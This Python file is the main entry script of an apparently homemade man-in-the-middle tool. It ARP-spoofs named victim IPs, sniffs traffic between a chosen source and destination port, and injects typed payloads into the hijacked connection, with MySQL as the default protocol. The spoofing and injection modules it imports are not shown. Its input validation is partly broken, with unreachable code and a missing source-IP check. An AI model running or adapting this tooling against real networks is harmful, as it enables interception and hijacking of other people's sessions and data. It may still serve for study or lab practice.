#! /usr/bin/python3
#import library ti handle command-line arguments
import argparse
#Library for a signal catching as interrupts (Ctrl+C)
import importlib
import signal
#Library for time managment
import time
#Library to interact with the Python runtime environment
import sys
#Library to interact with the oS
import os
#Libraru for the REGEX
import re
import scapy.all as scapy
from libs import injector, spoofing,sniffer as sniff,logger,packet as lpkt

log         = None
sniffer     = None
spoofer     = None
protocol    = None
mac         = ""
ip          = ""

# define our main fonction
def main():
    # import global settings(get all Var)
    global settings, log, ip, mac, sniffer, spoofer, protocol
    print ("""
        █▐▒▒░░■·  ▀█▀    ▀█▀ ▀███   ▀██▀ mitm
        █      ■·  ▀▀▌   █▀   ████   ██
        █       ■·   ▀██▀     ██ ██  ██ 
        █       ■·    █▀      ██  ██ ██
        █      ■·    █▀       ██   ████
        █▐▒▒░░■·   ▄█▀       ▄██▄   ███
    """)

    # argument parser to handle command-line arguments
    parser = argparse.ArgumentParser()
    #Optionnal argument to specify the attacker own Mac and ip Address
    parser.add_argument("--spoof", required=False, help="Enable spoofing [ip:ip:...]")

    firewall = parser.add_mutually_exclusive_group(required=False)
    #Optionnal firewall settings
    firewall.add_argument("--firewall",
                        help="while arp spoofing, create multiple rule inside firewall",
                        dest="firewall",
                        action='store_true')
    # disable firewall setings 
    firewall.add_argument("--no-firewall",
                        help="disable firewall rule creation",
                        dest="firewall",
                        action='store_false')

    #Optional : Arg to write in a .pcap file
    parser.add_argument("-w", "--write", help="create a pcap file.", required=False, default="")
    # Optional : Arg to execute a terminal protocl via standard input 
    parser.add_argument("-s", "--stdin", help="try to execute a terminal protocol.", required=False, default=False, action='store_true')
    #Argument for the network interface listener
    parser.add_argument("iface", help="Set interface listening to")
    #Argument for the ip source
    parser.add_argument("src", help="Source ip")
    #Arguement for the ip destination 
    parser.add_argument("dst", help="Destination ip")
    #Arguement for the port destination
    parser.add_argument("port", help="Destination port")
    # optionnal: control the verbosity of the program 0 = Silent 3 = most verbose
    parser.add_argument("--verbose",
                        help="Display more informations",
                        default=0, 
                        choices=[0, 1, 2, 3],
                        type=int)

    # Set the default firewall argument
    parser.set_defaults(firewall=True)
    # parse command-line argument
    args = parser.parse_args()
    log = logger.log(args.verbose)
        

#Regular expression for IP, MAC ant Port validation
    ip_reg = re.compile('^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)(\.(?!$)|$)){4}$')
    mac_reg = re.compile('^(([0-9a-f]{2})(:(?!$)|$)){6}$', re.IGNORECASE)
    port_reg = re.compile('^((6553[0-5])|(655[0-2][0-9])|(65[0-4][0-9]{2})|(6[0-4][0-9]{3})|([1-5][0-9]{4})|([0-5]{0,5})|([0-9]{1,4}))$')

    # Split the port argument into protocol and port
    [proto, port] = args.port.split(':')

    #Make sure the sript is bieing run as root
    if os.geteuid() != 0:
        print("this program should be run as root.")
        exit()

    #Make sure all the variable needed is here
    if len(args.src) == 0 or len(args.dst) == 0 or len(args.port) == 0:
        print("invalid arguments.")
        exit() 
        print("Invalid sources ip address!")
        exit()
    # Make sure IP format is OK
    elif not ip_reg.match(args.dst):
        print("Invalid destination ip address!")
        exit()
    # Make sure Port format is OK
    elif not port_reg.match(port):
        print("Invalid target port!")
        exit()
    
    # Set the global settings for SRC, DST, PORT and IFACE.
    src = args.src
    dst = args.dst
    iface = args.iface
    ip = scapy.get_if_addr(iface)
    mac = scapy.get_if_hwaddr(iface)

    # start spoofing if required
    if args.spoof is not None:
        spoofer = spoofing.spoofer(mac, ip, 0.5)
        for victim in args.spoof.split(':'):
            log.print("new victim {}".format(victim))
            if not ip_reg.match(victim):
                log.print('invalid ip {}'.format(victim))
            else: spoofer.spoof(victim, '172.18.255.255')
    spoofer.start()

    # initialize packet injection
    proto_name = "mysql" if len(proto) == 0 else proto
    log.print("protocol "+proto_name+" selected.")
    protocol = importlib.import_module("libs.proto."+proto_name).protocol(src, dst, mac)
    log.print("protocol was started.")
    #Start the sniffing packets
    sniffer = sniff.sniffer(src, dst, port, iface, protocol, mac, args.write)
    print("Connection hijacked, terminal:")
    
    # While the programe is running, accepting stdin process incoming data
    while args.stdin:
        payload = sys.stdin.readline()
        ready = lpkt.psh(payload)
        lpkt.send(ready)

# Def the exit fonction on Ctrl+C
def on_exit(*_):
    global sniffer, spoofer, protocol
    print("Killing threads and exiting...")
    if sniffer is not None:
        # Stop Sniffing
        sniffer.stop()
    if protocol is not None:
        protocol.stop()
    if spoofer is not None:
        spoofer.stop()
    sys.exit()

if __name__ == "__main__":
    # Catch interrupt singals and run on_exits fonction
    signal.signal(signal.SIGINT, on_exit)
    # Call the main fonction
    main()
